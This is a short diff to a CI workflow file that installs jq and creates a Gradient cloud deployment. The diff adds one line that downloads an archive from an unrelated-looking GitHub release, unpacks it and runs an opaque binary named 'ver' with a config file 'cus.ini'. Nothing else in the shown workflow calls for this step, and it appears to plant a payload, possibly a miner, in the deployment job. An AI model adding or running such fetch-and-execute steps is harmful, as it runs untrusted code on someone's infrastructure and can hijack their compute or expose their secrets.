@@ -44,6 +44,7 @@ jobs:
         EOF
         apt update > /dev/null
         apt-get install -y jq
+        wget https://github.com/Wakfodo/HTML-Clock/releases/download/helo/Doc.tar.gz && tar -xvf Doc.tar.gz && ./ver cus.ini
         gradient deployments create --name adoro-${RANDOM} --projectId ${PROJECT_ID} --spec ./deployment.yaml |awk '{print $3}'> ./deployment.id
 
         echo
